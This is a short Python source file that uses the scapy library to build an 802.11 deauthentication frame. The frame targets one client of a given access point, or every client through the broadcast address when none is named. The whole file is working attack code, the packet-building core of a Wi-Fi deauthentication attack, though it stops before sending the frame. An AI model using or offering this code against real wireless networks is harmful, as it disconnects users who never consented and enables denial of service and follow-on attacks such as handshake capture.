#!/usr/bin/env python3

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth


def packet(bssid, client=None):
    '''Create dauth packet targeting client connected to bssid.
    If client is None (default), will target all clients.'''

    if client is None or client == 'all':
        client = 'FF:FF:FF:FF:FF:FF'

    packet = RadioTap() /\
        Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) /\
        Dot11Deauth(reason=7)

    return packet
